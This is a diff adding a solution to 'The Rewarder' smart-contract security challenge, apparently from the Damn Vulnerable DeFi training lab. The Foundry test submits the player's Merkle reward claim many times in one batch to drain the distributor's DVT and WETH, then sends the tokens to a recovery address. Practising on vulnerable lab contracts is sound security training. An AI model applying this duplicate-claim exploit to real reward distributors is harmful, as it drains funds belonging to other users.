@@ -148,7 +148,53 @@ contract TheRewarderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_theRewarder() public checkSolvedByPlayer {
-        
+        console.log("player address", address(player)); // 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+        uint256 DVT_PLAYER_REWARD = 11524763827831882;
+        uint256 WETH_PLAYER_REWARD = 1171088749244340;
+
+        bytes32[] memory dvtLeaves = _loadRewards(
+            "/test/the-rewarder/dvt-distribution.json"
+        );
+        bytes32[] memory wethLeaves = _loadRewards(
+            "/test/the-rewarder/weth-distribution.json"
+        );
+
+        uint256 dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / DVT_PLAYER_REWARD;
+        uint256 wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / WETH_PLAYER_REWARD;
+        uint256 totalTxCount = dvtTxCount + wethTxCount;
+
+
+        Claim[] memory claims = new Claim[](totalTxCount);
+        for (uint256 i = 0; i < totalTxCount; i++) {
+            if (i < dvtTxCount) {
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first DVT batch
+                    amount: DVT_PLAYER_REWARD,
+                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
+                    proof: merkle.getProof(dvtLeaves, 188) // Players's address is at index 188
+                });
+            } else {
+                // And then, the WETH claim
+                claims[i] = Claim({
+                    batchNumber: 0, // claim corresponds to first WETH batch
+                    amount: WETH_PLAYER_REWARD,
+                    tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
+                    proof: merkle.getProof(wethLeaves, 188) // Players's address is at index 188
+                });
+            }
+        }
+
+        IERC20[] memory tokensToClaim = new IERC20[](2);
+        tokensToClaim[0] = IERC20(address(dvt));
+        tokensToClaim[1] = IERC20(address(weth));
+
+        distributor.claimRewards({
+            inputClaims: claims,
+            inputTokens: tokensToClaim
+        });
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
